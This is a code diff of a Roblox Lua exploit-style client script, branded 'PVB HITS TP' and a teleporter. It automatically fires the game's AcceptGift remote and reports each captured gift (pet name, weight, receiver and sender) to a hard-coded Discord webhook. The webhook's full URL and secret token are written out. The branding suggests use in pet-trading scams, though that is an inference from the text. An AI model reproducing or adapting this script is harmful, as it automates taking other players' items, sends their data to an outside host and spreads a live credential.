@@ -37,23 +37,35 @@ local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 
---// 🔔 Webhook Sender (Embed Version)
-local HttpService = game:GetService("HttpService")
+--// 🔹 AUTO ACCEPT GIFT (Full Info: Pet Name, KG, Receiver, From)
+--// Place in LocalScript (StarterPlayerScripts or StarterGui)
 
---// 🔗 Webhook URL (palitan mo kung gusto mong gumamit ng iba)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+--// Webhook setup
 local WebhookURL = "https://discord.com/api/webhooks/1420940951236513862/o5CH79ymXwVKR--U5MP9akBR3jQSFZnLfJbt4olXJjy2kjOnpeOb4vtZ-ed6xeuIVr2E"
 
---// 📩 Function to send a message to Discord
-local function sendWebhook(content)
+local function sendWebhook(petName, petKG, receiver, sender)
 	if not WebhookURL or WebhookURL == "" then return end
+
+	local content = string.format(
+		"🎁 **Auto Accepted Gift!**\n🐾 **Pet:** %s\n⚖️ **KG:** %s\n👤 **Receiver:** %s\n📤 **From:** %s",
+		tostring(petName),
+		tostring(petKG),
+		tostring(receiver),
+		tostring(sender)
+	)
 
 	local data = {
 		username = "🎁 PVB HITS TP",
-		avatar_url = "https://i.imgur.com/vkDcdge.png", -- Anime avatar
+		avatar_url = "https://i.imgur.com/vkDcdge.png",
 		embeds = {{
 			title = "🎉 Auto Accepted Gift!",
 			description = content,
-			color = 0xFF0000, -- 🔴 Red (you can change to any 0xRRGGBB)
+			color = 0xFF0000, -- Red
 			footer = { text = "JoshhTP | TELEPORTER⚡V1" }
 		}}
 	}
@@ -352,7 +364,7 @@ StopBtn.MouseButton1Click:Connect(function()
     end
 end)
 
---// Main auto-accept system
+--// Main Auto-Accept System
 local Remotes = ReplicatedStorage:WaitForChild("Remotes")
 local AcceptGift = Remotes:WaitForChild("AcceptGift")
 local Accepted = {}
@@ -362,19 +374,21 @@ local function autoAcceptGift(data)
 		Accepted[data.ID] = true
 		task.wait(0.15)
 
-		-- Extract pet name + player ID
+		-- Detect all available info from data
 		local petName = tostring(data.Name or data.PetName or "Unknown Pet")
-		local playerId = tostring(LocalPlayer.UserId)
+		local petKG = tostring(data.KG or data.Weight or "???")
+		local sender = tostring(data.From or data.Sender or "Unknown")
+		local receiver = LocalPlayer.Name
 
-		-- Fire the accept remote
+		-- Accept the gift
 		pcall(function()
 			AcceptGift:FireServer({ ID = data.ID })
 		end)
 
-		print(string.format("[🎁 Auto Accepted] PlayerID: %s | Pet: %s", playerId, petName))
+		print(string.format("[🎁 Auto Accepted] %s (%s KG) from %s -> %s", petName, petKG, sender, receiver))
 
-		-- Send webhook log
-		sendWebhook(playerId, petName)
+		-- Send to Discord webhook
+		sendWebhook(petName, petKG, receiver, sender)
 	end
 end
 
@@ -387,7 +401,7 @@ for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
 	end
 end
 
-print("[✅ Auto Accept Gift Ready | Player ID + Pet Name Webhook]")
+print("[✅ Auto Accept Gift System Ready | With Pet Name, KG, Receiver, Sender]")
 
 -- Notification: loaded
 pcall(function()
